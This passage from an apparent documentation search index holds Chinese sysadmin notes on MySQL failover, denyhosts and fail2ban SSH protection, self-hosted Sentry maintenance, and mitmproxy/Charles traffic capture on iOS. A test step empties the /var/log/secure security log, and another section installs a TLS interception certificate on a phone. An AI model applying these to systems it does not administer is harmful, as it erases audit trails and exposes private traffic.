\u7528\u6237\u76d1\u63a7\u6570\u636e\u5e93\u72b6\u6001\u7684MySQL\u7528\u6237\uff08replication\uff09 \u590d\u5236\u7528\u6237 1 \u7528\u4e8e\u914d\u7f6eMySQL\u590d\u5236\u7684\u7528\u6237 <p>MHA\u91c7\u7528\u7684\u662f\u4eceslave\u4e2d\u9009\u51faMaster\uff0c\u6545\u969c\u8f6c\u79fb\uff1a</p> <ul> <li>\u4ece\u670d\u52a1\u5668\uff1a</li> <li>\u9009\u4e3e\u5177\u6709\u6700\u65b0\u66f4\u65b0\u7684slave</li> <li>\u5c1d\u8bd5\u4ece\u5b95\u673a\u7684master\u4e2d\u4fdd\u5b58\u4e8c\u8fdb\u5236\u65e5\u5fd7</li> <li>\u5e94\u7528\u5dee\u5f02\u7684\u4e2d\u7ee7\u65e5\u5fd7\u5230\u5176\u5b83\u7684slave</li> <li>\u5e94\u7528\u4ecemaster\u4fdd\u5b58\u7684\u4e8c\u8fdb\u5236\u65e5\u5fd7</li> <li>\u63d0\u5347\u9009\u4e3e\u7684slave\u4e3amaster</li> <li>\u914d\u7f6e\u5176\u5b83\u7684slave\u5411\u65b0\u7684master\u540c\u6b65</li> </ul> <p>\u4f18\u70b9\uff1a</p> <ul> <li>MHA\u9664\u4e86\u652f\u6301\u65e5\u5fd7\u70b9\u7684\u590d\u5236\u8fd8\u652f\u6301GTID\u7684\u65b9\u5f0f</li> <li>\u540cMMM\u76f8\u6bd4\uff0cMHA\u4f1a\u5c1d\u8bd5\u4ece\u65e7\u7684Master\u4e2d\u6062\u590d\u65e7\u7684\u4e8c\u8fdb\u5236\u65e5\u5fd7\uff0c\u53ea\u662f\u672a\u5fc5\u6bcf\u6b21\u90fd\u80fd\u6210\u529f\u3002\u5982\u679c\u5e0c\u671b\u66f4\u5c11\u7684\u6570\u636e\u4e22\u5931\u573a\u666f\uff0c\u5efa\u8bae\u4f7f\u7528MHA\u67b6\u6784\u3002</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <p>MHA\u9700\u8981\u81ea\u884c\u5f00\u53d1VIP\u8f6c\u79fb\u811a\u672c\u3002</p> <p>MHA\u53ea\u76d1\u63a7Master\u7684\u72b6\u6001\uff0c\u672a\u76d1\u63a7Slave\u7684\u72b6\u6001</p>"},{"location":"daily/48-mysql/#15-mgr","title":"1.5 MGR","text":"<p>MGR\u662f\u57fa\u4e8e\u73b0\u6709\u7684MySQL\u67b6\u6784\u5b9e\u73b0\u7684\u590d\u5236\u63d2\u4ef6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u591a\u4e2a\u4e3b\u5bf9\u6570\u636e\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u7528paxos\u534f\u8bae\u590d\u5236\uff0c\u4e0d\u540c\u4e8e\u5f02\u6b65\u590d\u5236\u7684\u591aMaster\u590d\u5236\u96c6\u7fa4\u3002</p> <p>\u652f\u6301\u591a\u4e3b\u6a21\u5f0f\uff0c\u4f46\u5b98\u65b9\u63a8\u8350\u5355\u4e3b\u6a21\u5f0f\uff1a</p> <ul> <li>\u591a\u4e3b\u6a21\u5f0f\u4e0b\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u968f\u673a\u5411MySQL\u8282\u70b9\u5199\u5165\u6570\u636e</li> <li>\u5355\u4e3b\u6a21\u5f0f\u4e0b\uff0cMGR\u96c6\u7fa4\u4f1a\u9009\u51faprimary\u8282\u70b9\u8d1f\u8d23\u5199\u8bf7\u6c42\uff0cprimary\u8282\u70b9\u4e0e\u5176\u5b83\u8282\u70b9\u90fd\u53ef\u4ee5\u8fdb\u884c\u8bfb\u8bf7\u6c42\u5904\u7406.</li> </ul> <pre><code># \u67e5\u770bMGR\u7684\u7ec4\u5458\nselect * from performance_schema.replication_group_members;\n\n# \u67e5\u770bMGR\u7684\u72b6\u6001\nselect * from performance_schema.replication_group_member_stats;\n\n# \u67e5\u770bMGR\u7684\u4e00\u4e9b\u53d8\u91cf\nshow variables like 'group%';\n\n# \u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u53ea\u8bfb\nshow variables like 'read_only%';\n</code></pre> <p>\u4f18\u70b9\uff1a</p> <ul> <li>\u57fa\u672c\u65e0\u5ef6\u8fdf\uff0c\u5ef6\u8fdf\u6bd4\u5f02\u6b65\u7684\u5c0f\u5f88\u591a</li> <li>\u652f\u6301\u591a\u5199\u6a21\u5f0f\uff0c\u4f46\u662f\u76ee\u524d\u8fd8\u4e0d\u662f\u5f88\u6210\u719f</li> <li>\u6570\u636e\u7684\u5f3a\u4e00\u81f4\u6027\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u4e8b\u52a1\u4e0d\u4e22\u5931</li> </ul> <p>\u7f3a\u70b9:</p> <ul> <li>\u4ec5\u652f\u6301innodb</li> <li>\u53ea\u80fd\u7528\u5728GTID\u6a21\u5f0f\u4e0b\uff0c\u4e14\u65e5\u5fd7\u683c\u5f0f\u4e3arow\u683c\u5f0f</li> </ul> <p>\u9002\u7528\u7684\u4e1a\u52a1\u573a\u666f\uff1a</p> <ul> <li>\u5bf9\u4e3b\u4ece\u5ef6\u8fdf\u6bd4\u8f83\u654f\u611f</li> <li>\u5e0c\u671b\u5bf9\u5bf9\u5199\u670d\u52a1\u63d0\u4f9b\u9ad8\u53ef\u7528\uff0c\u53c8\u4e0d\u60f3\u5b89\u88c5\u7b2c\u4e09\u65b9\u8f6f\u4ef6</li> <li>\u6570\u636e\u5f3a\u4e00\u81f4\u7684\u573a\u666f</li> </ul> <p>\u8bfb\u5199\u8d1f\u8f7d\u5927\u95ee\u9898</p> <p>\u8bfb\u8d1f\u8f7d\u5927\uff1a</p> <ul> <li>\u589e\u52a0slave</li> <li>\u52a0\u4e2d\u95f4\u5c42(MyCat\uff0cProxySQL\uff0cMaxscale)</li> <li>\u8bfb\u5199\u5206\u79bb</li> </ul> <p>\u5173\u4e8e\u5199\u8d1f\u8f7d\u5927\uff1a</p> <ul> <li>\u5206\u5e93\u5206\u8868</li> <li>\u589e\u52a0\u4e2d\u95f4\u5c42</li> </ul>"},{"location":"daily/50-denyhosts/","title":"denyhosts","text":"<p>Reference</p>"},{"location":"daily/50-denyhosts/#_1","title":"\u4e00\u3001\u76ee\u5f55\u8bf4\u660e","text":"<p>\u8be5\u76ee\u5f55\u4e2d\u4e3b\u8981\u5b58\u653e\u8ba1\u5212\u4efb\u52a1\uff0c\u65e5\u5fd7\u538b\u7f29 \u4ee5\u53ca chkconfig \u548c service \u542f\u52a8\u7684\u6587\u6863 </p> <pre><code>/etc/cron.d/denyhosts \n/etc/denyhosts.conf \n/etc/logrotate.d/denyhosts \n/etc/rc.d/init.d/denyhosts \n/etc/sysconfig/denyhosts \n</code></pre> <p>\u8be5\u76ee\u5f55\u4e2d\u4e3b\u8981\u5b58\u653e denyhosts \u6240\u62d2\u7edd\u53ca\u5141\u8bb8\u7684\u4e00\u4e9b\u4e3b\u673a\u4fe1\u606f </p> <pre><code>/var/lib/denyhosts/allowed-hosts \n/var/lib/denyhosts/allowed-warned-hosts \n/var/lib/denyhosts/hosts \n/var/lib/denyhosts/hosts-restricted \n/var/lib/denyhosts/hosts-root \n/var/lib/denyhosts/hosts-valid \n/var/lib/denyhosts/offset \n/var/lib/denyhosts/suspicious-logins \n/var/lib/denyhosts/sync-hosts \n/var/lib/denyhosts/users-hosts \n/var/lib/denyhosts/users-invalid \n/var/lib/denyhosts/users-valid \n/var/log/denyhosts \n</code></pre>"},{"location":"daily/50-denyhosts/#_2","title":"\u4e8c\u3001\u914d\u7f6e\u53c2\u6570","text":"<p><code>/etc/denyhosts.conf</code></p> <pre><code> ~ # egrep -v \"(^$|^#)\" /etc/denyhosts.conf \n############ THESE SETTINGS ARE REQUIRED ############ \n# \u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u6587\u4ef6\uff0c\u4e3b\u8981\u83b7\u53d6ssh\u4fe1\u606f \nSECURE_LOG = /var/log/secure \n# \u62d2\u7edd\u5199\u5165IP\u6587\u4ef6 hosts.deny \nHOSTS_DENY = /etc/hosts.deny \n# #\u8fc7\u591a\u4e45\u540e\u6e05\u9664\u5df2\u7ecf\u7981\u6b62\u7684\uff0c\u5176\u4e2dw\u4ee3\u8868\u5468\uff0cd\u4ee3\u8868\u5929\uff0ch\u4ee3\u8868\u5c0f\u65f6\uff0cs\u4ee3\u8868\u79d2\uff0cm\u4ee3\u8868\u5206\u949f \nPURGE_DENY = 4w \n# denyhosts\u6240\u8981\u963b\u6b62\u7684\u670d\u52a1\u540d\u79f0 \nBLOCK_SERVICE  = sshd \n# \u5141\u8bb8\u65e0\u6548\u7528\u6237\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570 \nDENY_THRESHOLD_INVALID = 3 \n# \u5141\u8bb8\u666e\u901a\u7528\u6237\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570 \nDENY_THRESHOLD_VALID = 10 \n# \u5141\u8bb8ROOT\u7528\u6237\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570 \nDENY_THRESHOLD_ROOT = 6 \n# \u8bbe\u5b9a deny host \u5199\u5165\u5230\u8be5\u8d44\u6599\u5939 \nDENY_THRESHOLD_RESTRICTED = 1 \n# \u5c06deny\u7684host\u6216ip\u7eaa\u5f55\u5230Work_dir\u4e2d \nWORK_DIR = /var/lib/denyhosts \nSUSPICIOUS_LOGIN_REPORT_ALLOWED_HOSTS=YES \n# \u662f\u5426\u505a\u57df\u540d\u53cd\u89e3 \nHOSTNAME_LOOKUP=YES \n# \u5c06DenyHOts\u542f\u52a8\u7684pid\u7eaa\u5f55\u5230LOCK_FILE\u4e2d\uff0c\u5df2\u786e\u4fdd\u670d\u52a1\u6b63\u786e\u542f\u52a8\uff0c\u9632\u6b62\u540c\u65f6\u542f\u52a8\u591a\u4e2a\u670d\u52a1 \nLOCK_FILE = /var/lock/subsys/denyhosts \n\n       ############ THESE SETTINGS ARE OPTIONAL ############ \n# \u7ba1\u7406\u5458Mail\u5730\u5740 \nADMIN_EMAIL = root \nSMTP_HOST = localhost \nSMTP_PORT = 25 \nSMTP_FROM = DenyHosts nobody@localhost \nSMTP_SUBJECT = DenyHosts Report from $[HOSTNAME] \n\n# \u6709\u6548\u7528\u6237\u767b\u5f55\u5931\u8d25\u8ba1\u6570\u5f52\u96f6\u7684\u65f6\u95f4 \nAGE_RESET_VALID=5d \n# ROOT\u7528\u6237\u767b\u5f55\u5931\u8d25\u8ba1\u6570\u5f52\u96f6\u7684\u65f6\u95f4 \nAGE_RESET_ROOT=25d \n\n# \u7528\u6237\u7684\u5931\u8d25\u767b\u5f55\u8ba1\u6570\u91cd\u7f6e\u4e3a0\u7684\u65f6\u95f4(/usr/share/denyhosts/restricted-usernames) \nAGE_RESET_RESTRICTED=25d \n\n# \u65e0\u6548\u7528\u6237\u767b\u5f55\u5931\u8d25\u8ba1\u6570\u5f52\u96f6\u7684\u65f6\u95f4 \nAGE_RESET_INVALID=10d \n\n  ######### THESE SETTINGS ARE SPECIFIC TO DAEMON MODE  ########## \n# denyhosts log\u6587\u4ef6 \nDAEMON_LOG = /var/log/denyhosts \nDAEMON_SLEEP = 30s \n# \u8be5\u9879\u4e0ePURGE_DENY \u8bbe\u7f6e\u6210\u4e00\u6837\uff0c\u4e5f\u662f\u6e05\u9664hosts.deniedssh \u7528\u6237\u7684\u65f6\u95f4 \nDAEMON_PURGE = 1h \n</code></pre>"},{"location":"daily/50-denyhosts/#_3","title":"\u56db\u3001\u542f\u52a8\u670d\u52a1","text":"<p>\u670d\u52a1\u5e76\u67e5\u770b\u72b6\u6001 </p>"},{"location":"daily/50-denyhosts/#_4","title":"\u4e94\u3001\u901a\u8fc7\u6d4b\u8bd5","text":"<pre><code># invalid\u3001valid\u3001root \u7b49\u7528\u6237\u8bbe\u7f6e\u4e0d\u540c\u7684ssh\u8fde\u63a5\u5931\u8d25\u6b21\u6570\uff0c\u6765\u6d4b\u8bd5 denyhosts \uff0c\u6211\u8fd9\u8fb9\u53ea\u6d4b\u8bd5\u4f7f\u7528\u7cfb\u7edf\u4e2d\u4e0d\u5b58\u5728\u7684\u7528\u6237\u8fdb\u884c\u5931\u8d25\u767b\u5f55\u5c1d\u8bd5~ \n# \u6211\u4eec\u5141\u8bb8 invalid \u7528\u6237\u53ea\u80fd\u5931\u8d254\u6b21\u3001ROOT \u7528\u6237\u5931\u8d257\u6b21\u3001valid\u7528\u6237\u5931\u8d2510\u6b21 \n\nDENY_THRESHOLD_INVALID = 4 \nDENY_THRESHOLD_VALID = 10 \nDENY_THRESHOLD_ROOT = 7 \n\n# \u6d4b\u8bd5\uff1a\u4f7f\u7528\u4e00\u4e2a\u6ca1\u6709\u521b\u5efa\u7684\u7528\u6237\u5931\u8d25\u767b\u5f55\u56db\u6b21\uff0c\u5e76\u67e5\u770b /etc/hosts.deny \n\necho -n \"\"  &gt; /var/log/secure \ntail -f /var/log/secure \ntail -f /etc/hosts.deny \n\n/var/log/secure # \u65e5\u5fd7\u4fe1\u606f\uff1a \n/etc/hosts.deny # \u4fe1\u606f\uff1a \n# \u7528\u6237\u767b\u5f55\u4fe1\u606f\uff1a \n</code></pre>"},{"location":"daily/50-denyhosts/#_5","title":"\u516d\u3001\u7ef4\u62a4\u7ba1\u7406","text":"<ul> <li>\u5173\u4e8e\u6e05\u9664</li> <li>\u6dfb\u52a0\u53ef\u4fe1\u4e3b\u673a\u8bb0\u5f55 </li> </ul> <p>\u5982\u679c\u60f3\u5220\u9664\u4e00\u4e2a\u5df2\u7ecf\u7981\u6b62\u7684\u4e3b\u673aIP\uff0c\u53ea\u5728 /etc/hosts.deny \u5220\u9664\u662f\u6ca1\u7528\u7684\u3002\u9700\u8981\u8fdb\u5165 /var/lib/denyhosts \u76ee\u5f55\uff0c\u8fdb\u5165\u4ee5\u4e0b\u64cd\u4f5c\uff1a </p> <ol> <li> <p>\u505c\u6b62DenyHosts\u670d\u52a1\uff1aservice denyhosts stop </p> </li> <li> <p>\u5728 /etc/hosts.deny \u4e2d\u5220\u9664\u4f60\u60f3\u53d6\u6d88\u7684\u4e3b\u673aIP </p> </li> <li> <p>\u7f16\u8f91 DenyHosts \u5de5\u4f5c\u76ee\u5f55\u7684\u6240\u6709\u6587\u4ef6 /var/lib/denyhosts\uff0c\u5e76\u4e14\u5220\u9664\u5df2\u88ab\u6dfb\u52a0\u7684\u4e3b\u673a\u4fe1\u606f\u3002 </p> </li> </ol> <pre><code>/var/lib/denyhosts/hosts \n/var/lib/denyhosts/hosts-restricted \n/var/lib/denyhosts/hosts-root \n/var/lib/denyhosts/hosts-valid \n/var/lib/denyhosts/users-hosts \n/var/lib/denyhosts/users-invalid \n/var/lib/denyhosts/users-valid \n</code></pre> <ol> <li>\u6dfb\u52a0\u4f60\u60f3\u5141\u8bb8\u7684\u4e3b\u673aIP\u5730\u5740\u5230 </li> </ol> <p><code>/var/lib/denyhosts/allowed-hosts</code></p> <ol> <li>\u542f\u52a8DenyHosts\u670d\u52a1\uff1a service denyhosts start </li> </ol> <pre><code>#! /bin/bash\n\nclean(){\n    echo \"try clean $ip is denyhost info\"    \n    sed -i '/'$ip'/d' /usr/share/denyhosts/data/hosts\n    sed -i '/'$ip'/d' /usr/share/denyhosts/data/hosts-root\n    sed -i '/'$ip'/d' /usr/share/denyhosts/data/hosts-valid\n    sed -i '/'$ip'/d' /usr/share/denyhosts/data/hosts-restricted\n    sed -i '/'$ip'/d' /usr/share/denyhosts/data/users-hosts\n    sed -i '/'$ip'/d' /etc/hosts.deny\n\n}\n</code></pre>"},{"location":"daily/50-denyhosts/#_6","title":"\u4e03\u3001\u53d1\u9001\u4fe1\u606f","text":"<p>\u901a\u8fc7\u90ae\u4ef6\u63a5\u6536 denyhosts \u6240</p> <ol> <li>\u4fee\u6539 /etc/denyhosts.conf \u914d\u7f6e\u6863\uff0c\u5e76\u91cd\u542f denyhosts \u670d\u52a1 </li> </ol> <pre><code>ADMIN_EMAIL = xx \nSMTP_HOST = mail.server.com \nSMTP_PORT = 25 \nSMTP_FROM = DenyHosts &lt;xx&gt;\n</code></pre> <ol> <li>\u901a\u8fc7\u5176\u4ed6\u5ba2\u6237\u7aef\u8fdb\u884c\u591a\u6b21\u5931\u8d25\u767b\u5f55\u5c1d\u8bd5 </li> </ol>"},{"location":"daily/50-denyhosts/#fail2ban","title":"\u516b\u3001fail2ban","text":"<p>fail2ban</p> <p>install</p> <pre><code>yum install fail2ban -y -q \n</code></pre>"},{"location":"daily/50-denyhosts/#81-config","title":"8.1 config","text":"<pre><code>cp fail2ban.conf fail2ban.local\ncp jail.conf jail.local\n\n# jail.local\n[sshd]\nenable = ture\nport = 60022\nfilter =sshd\nlogpath = /var/log/secure\nmaxretry = 5\nbantime = 1800\n</code></pre> <p>jail.local</p> <pre><code>[DEFAULT]\n# \u4ee5\u7a7a\u683c\u5206\u9694\u7684\u5217\u8868\uff0c\u53ef\u4ee5\u662f IP \u5730\u5740\u3001CIDR \u524d\u7f00\u6216\u8005 DNS \u4e3b\u673a\u540d\n# \u7528\u4e8e\u6307\u5b9a\u54ea\u4e9b\u5730\u5740\u53ef\u4ee5\u5ffd\u7565 fail2ban \u9632\u5fa1\nignoreip = 127.0.0.1 172.31.0.0/24 10.10.0.0/24 192.168.0.0/24\n\n# \u5ba2\u6237\u7aef\u4e3b\u673a\u88ab\u7981\u6b62\u7684\u65f6\u957f\uff08\u79d2\uff09\nbantime = 86400\n\n# \u5ba2\u6237\u7aef\u4e3b\u673a\u88ab\u7981\u6b62\u524d\u5141\u8bb8\u5931\u8d25\u7684\u6b21\u6570 \nmaxretry = 5\n\n# \u67e5\u627e\u5931\u8d25\u6b21\u6570\u7684\u65f6\u957f\uff08\u79d2\uff09\nfindtime = 600\n\nmta = sendmail\n\n[ssh-iptables]\nenabled = true\nfilter = sshd\naction = iptables[name=SSH, port=ssh, protocol=tcp]\nsendmail-whois[name=SSH, dest=your@email.com, sender=fail2ban@email.com]\n# Debian \u7cfb\u7684\u53d1\u884c\u7248 \nlogpath = /var/log/auth.log\n# Red Hat \u7cfb\u7684\u53d1\u884c\u7248\nlogpath = /var/log/secure\n# ssh \u670d\u52a1\u7684\u6700\u5927\u5c1d\u8bd5\u6b21\u6570 \nmaxretry = 3\n</code></pre>"},{"location":"daily/50-denyhosts/#82-status","title":"8.2 status","text":"<pre><code>fail2ban-client status\nfail2ban-client status sshd\n</code></pre>"},{"location":"daily/51-sentry/","title":"sentry","text":"<p>Reference</p>"},{"location":"daily/51-sentry/#_1","title":"\u4e00\u3001\u51c6\u5907","text":""},{"location":"daily/51-sentry/#11-geoip","title":"1.1 GeoIP","text":"<pre><code># \u53c2\u8003\u7248\u672c 23.5.1\n\n# \u5148\u786e\u8ba4\u662f\u5426\u652f\u6301 SSE4.2\ngrep -i sse4 /proc/cpuinfo \n\n# config geoip\n# https://develop.sentry.dev/self-hosted/geolocation/\ncat &gt; geoip/GeoIP.conf &lt;&lt;EOF\nAccountID 871425\nLicenseKey xxxxxx\nEditionIDs GeoLite2-ASN GeoLite2-City GeoLite2-Country\nEOF\n</code></pre>"},{"location":"daily/51-sentry/#12-email","title":"1.2 Email","text":"<pre><code># config mail\nvim sentry/config.yml\n...\nmail.host: 'smtp.exmail.qq.com'\nmail.port: 465\nmail.username: 'sentry@8ops.top'\nmail.password: 'xxxxxx'\nmail.use-tls: true\nmail.use-ssl: false\nmail.from: 'Sentry &lt;sentry-noreplay@8ops.top&gt;'\n...\n\n# \u6ce8\u610f\n#1. \u7aef\u53e3\u662f587\u4e0d\u662f465\n#2. \u5bc6\u7801\u662f \u8bbe\u7f6e-\u5fae\u4fe1\u7ed1\u5b9a-\u5b89\u5168\u767b\u5f55-\u5ba2\u6237\u7aef\u4e13\u7528\u5bc6\u7801\uff0c\u4e0d\u662f\u4f01\u4e1a\u5fae\u4fe1\u767b\u5f55\u5bc6\u7801\n</code></pre>"},{"location":"daily/51-sentry/#_2","title":"\u4e8c\u3001\u642d\u5efa","text":"<pre><code>cd /usr/local\nSENTRY_VERSION=24.4.2\nwget https://github.com/getsentry/self-hosted/archive/refs/tags/${SENTRY_VERSION}.tar.gz\ntar xzf ${SENTRY_VERSION}.tar.gz -C .\nln -s self-hosted-${SENTRY_VERSION} sentry\ncd sentry\n./install.sh\n\n# \u5148\u5b89\u88c5\uff0c\u518d\u66f4\u65b0\u914d\u7f6e\uff0c\u907f\u514d\u66ff\u6362 system.secret-key\n\n# \u4f18\u5316\u6e90\nvim jq/sources.list\n\ndeb http://mirrors.aliyun.com/debian/ bookworm main contrib non-free\ndeb-src https://mirrors.aliyun.com/debian/ bookworm main contrib non-free\n\ndeb https://mirrors.aliyun.com/debian-security/ bookworm-security main contrib non-free\ndeb-src https://mirrors.aliyun.com/debian-security/ bookworm-security main contrib non-free\n\ndeb https://mirrors.aliyun.com/debian/ bookworm-updates main contrib non-free\ndeb-src https://mirrors.aliyun.com/debian/ bookworm-updates main contrib non-free\n\n\ncp jq/sources.list cron/ \ncp jq/sources.list workstation/\n\nCOPY sources.list /etc/apt/sources.list\n</code></pre>"},{"location":"daily/51-sentry/#_3","title":"\u4e09\u3001\u6269\u5c55","text":"<pre><code># .env \u6587\u4ef6\nCOMPOSE_PROJECT_NAME=sentry-self-hosted\nSENTRY_EVENT_RETENTION_DAYS=90\n# You can either use a port number or an IP:PORT combo for SENTRY_BIND\n# See https://docs.docker.com/compose/compose-file/#ports for more\nSENTRY_BIND=9000\n# Set SENTRY_MAIL_HOST to a valid FQDN (host/domain name) to be able to send emails!\n# SENTRY_MAIL_HOST=example.com\nSENTRY_IMAGE=getsentry/sentry:nightly\nSNUBA_IMAGE=getsentry/snuba:nightly\nRELAY_IMAGE=getsentry/relay:nightly\nSYMBOLICATOR_IMAGE=getsentry/symbolicator:nightly\nVROOM_IMAGE=getsentry/vroom:nightly\nWAL2JSON_VERSION=latest\nHEALTHCHECK_INTERVAL=30s\nHEALTHCHECK_TIMEOUT=1m30s\nHEALTHCHECK_RETRIES=10\n</code></pre>"},{"location":"daily/51-sentry/#_4","title":"\u56db\u3001\u95ee\u9898","text":"<pre><code># \u914d\u7f6e\nhttps://sentry.8ops.top/manage/settings/\n\n# 1. root\n# 2. security\n# 3. limit\n\n# config.yml\uff0c\u82e5\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u5219\u9875\u9762\u65e0\u6cd5\u4fee\u6539\nsystem.url-prefix: 'https://sentry.8ops.top'\nsystem.event-retention-days: '7'\n\ndocker exec -it sentry-self-hosted_worker_1 bash\nsentry cleanup --days 7\n\ndocker exec -it sentry-self-hosted_postgres_1 bash\nvacuumdb -U postgres -d postgres -v -f --analyze\n</code></pre>"},{"location":"daily/51-sentry/#41","title":"4.1 \u5b98\u65b9\u8bbe\u7f6e\u65b9\u6848","text":"<p>\u4fee\u6539 .env\u6587\u4ef6\u7684\u4ee5\u4e0b\u914d\u7f6e</p> <pre><code>SENTRY_EVENT_RETENTION_DAYS=7\n</code></pre>"},{"location":"daily/51-sentry/#42-sentry","title":"4.2 SENTRY\u6570\u636e\u8f6f\u6e05\u7406","text":"<pre><code>#\u767b\u5f55worker\u5bb9\u5668\ndocker exec -it sentry_onpremise_worker_1 /bin/bash \n\n#\u4fdd\u7559\u591a\u5c11\u5929\u7684\u6570\u636e\uff0ccleanup\u4f7f\u7528delete\u547d\u4ee4\u5220\u9664postgresql\u6570\u636e\uff0c\u4f46\u5bf9\u4e8edelete,update\u7b49\u64cd\u4f5c\uff0c\u53ea\u662f\u5c06\u5bf9\u5e94\u884c\u6807\u5fd7\u4e3aDEAD\uff0c\u5e76\u6ca1\u6709\u771f\u6b63\u91ca\u653e\u78c1\u76d8\u7a7a\u95f4\nsentry cleanup --days 7\n</code></pre>"},{"location":"daily/51-sentry/#43-postgres","title":"4.3 POSTGRES\u6570\u636e\u6e05\u7406","text":"<pre><code>#\u767b\u5f55postgres\u5bb9\u5668\ndocker exec -it sentry_onpremise_postgres_1 /bin/bash\n#\u8fd0\u884c\u6e05\u7406\nvacuumdb -U postgres -d postgres -v -f --analyze\n</code></pre>"},{"location":"daily/51-sentry/#4","title":"4. \u5b9a\u65f6\u6e05\u7406\u811a\u672c\u53c2\u8003","text":"<pre><code>0 1 * * * cd /root/onpremise &amp;&amp; { time docker-compose run --rm worker cleanup --days 7; } &amp;&gt; /var/log/sentry-cleanup.log\n\n0 8 * * * { time docker exec -i $(docker ps --format \"table {{.Names}}\"|grep postgres) vacuumdb -U postgres -d postgres -v -f --analyze; } &amp;&gt; /var/logs/sentry-vacuumdb.log\n</code></pre>"},{"location":"daily/51-sentry/#45-kafka","title":"4.5 \u6e05\u7406kafka\u78c1\u76d8\u5360\u7528","text":"<p>\u6e05\u7406kafka\u5360\u7528\u78c1\u76d8\u8fc7\u5927\u7684\u95ee\u9898\u641c\u5230\u53ef\u4ee5\u914d\u7f6e .env\uff0c\u5982\u4e0b:</p> <pre><code>KAFKA_LOG_RETENTION_HOURS=24\nKAFKA_LOG_RETENTION_BYTES=53687091200   #50G\nKAFKA_LOG_SEGMENT_BYTES=1073741824      #1G\nKAFKA_LOG_RETENTION_CHECK_INTERVAL_MS=300000\nKAFKA_LOG_SEGMENT_DELETE_DELAY_MS=60000\n</code></pre>"},{"location":"daily/51-sentry/#46-100","title":"4.6 \u5360\u6ee1100%\u5904\u7406","text":"<p>\u5982\u679c\u5df2\u7ecf\u5360\u6ee1100%\uff0c\u53ef\u4ee5\u5148\u53bb\u67e5\u627e\u7b5b\u9009\u51fa\u78c1\u76d8\u4e0a\u5176\u4ed6\u5360\u7528\u5f88\u5927\u7684\u65e0\u7528\u6587\u4ef6\u6216\u8005\u65e5\u5fd7\u7b49\uff0c\u91ca\u653e\u51fa\u4e00\u90e8\u5206\u7a7a\u95f4\u3002</p>"},{"location":"daily/51-sentry/#47","title":"4.7 \u521d\u6b21\u5b89\u88c5\u5bf9\u8bbf\u95ee\u57df\u540d\u53d7\u4fe1","text":"<p>Reference</p> <pre><code>vim sentry/sentry.conf.py\n\nCSRF_TRUSTED_ORIGINS = [\"https://sentry.8ops.top\", \"http://10.11.3.8:9000\", \"http://127.0.0.1:9000\"]\n</code></pre>"},{"location":"daily/52-mitmproxy/","title":"mitmproxy","text":""},{"location":"daily/52-mitmproxy/#_1","title":"\u4e00\u3001\u534f\u8bae\u5305","text":""},{"location":"daily/52-mitmproxy/#11-mitmproxy","title":"1.1 mitmproxy","text":"<p>\u534f\u8bae\u5c42\u6293\u5305\u795e\u5668\uff0c\u540c\u7c7b\u578b\u5de5\u5177\u6709charles</p> <pre><code># server\nmitmproxy \n# default port 8000\n\n# iphone\n## \u8bbe\u7f6e\u7f51\u7edc\u4ee3\u7406\u540e\n## \u6d4f\u89c8\u5668\u8bbf\u95ee http://mitm.it \u5b89\u88c5\u8bc1\u4e66\n</code></pre> <p>\u53cc\u5411\u8ba4\u8bc1\u573a\u666f</p> <ul> <li>\u9700\u8981\u5173\u95ed\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u8bc1\u4e66\u8ba4\u8bc1</li> </ul>"},{"location":"daily/52-mitmproxy/#12-charles","title":"1.2 charles","text":"<pre><code># default port 8888\n\n# iphone\n## \u8bbe\u7f6e\u7f51\u7edc\u4ee3\u7406\u540e\n## \u6d4f\u89c8\u5668\u8bbf\u95ee http://charlesproxy.com/getssl\n## \u6d4f\u89c8\u5668\u8bbf\u95ee http://char.pro/getssl\n</code></pre>"},{"location":"daily/52-mitmproxy/#_2","title":"\u4e8c\u3001\u7f51\u7edc\u5305","text":"<pre><code># install rvictl \u5339\u914d macOS \u7684\u7248\u672c\n# https://developer.apple.com/download/all/?q=command%20tools%20for%20xcode\n# \u7528\u4e8e macOS 14.2\n# https://m.8ops.top/mac/Command_Line_Tools_macOS_10.14_for_Xcode_10.1.dmg\n\nhttps://www.pgyer.com/tools/udid \u901a\u8fc7\u7b2c\u4e09\u65b9\u83b7\u53d6\u8bbe\u5907uuid\n\nrvictl -s udid\n\nrvictl -s c7ce66e439840cf02fa3482ae8985cca0a838e0d\n\niOS \u865a\u62df\u7f51\u5361\u6293 \u5305\n\n \u7b2c\u4e00\u6b65\uff1a\u4f7f\u7528USB\u6570\u636e\u7ebf\u5c06iOS\u8bbe\u5907\u8fde\u63a5\u5230MAC\u4e0a\n\n\u7b2c\u4e8c\u6b65\uff1a\u83b7\u5f97iOS\u8bbe\u5907\u7684UDID\uff0c\u53ef\u4ee5\u4f7f\u7528iTools\u67e5\u770b\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Xcode\u7684Organizer\u5de5\u5177\u67e5\u770b\n\n\u7b2c\u4e09\u6b65\uff1a\u521b\u5efaRVI\u63a5\u53e3\n\n$ rvictl -s &lt;UDID&gt; \n\n RVI\u865a\u62df\u63a5\u53e3\u7684\u547d\u4ee4\u89c4\u5219\u53ef\u4e3arvi0\uff0crvi1\uff0c\u3002\u3002\u3002,\u521b\u5efa\u540e\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\u662f\u5426\u521b\u5efa\u6210\u529f\n\n$ ifconfig rvi0\n\n \u7b2c\u56db\u6b65\uff1a\u5728mac\u4e0a\u7528\u6293\u5305\u5de5\u5177wireshark\u6216tcpdump\u7b49\u5de5\u5177\u6293\u5305\u5206\u6790\n\n$ sudo tcpdump -i rvi0 -n -vv  \n\n\u7b2c\u4e94\u6b65\uff1a\u5206\u6790\u7ed3\u675f\u540e\uff0c\u79fb\u9664\u521b\u5efa\u7684RVI\u63a5\u53e3\n\n$ rvictl -x 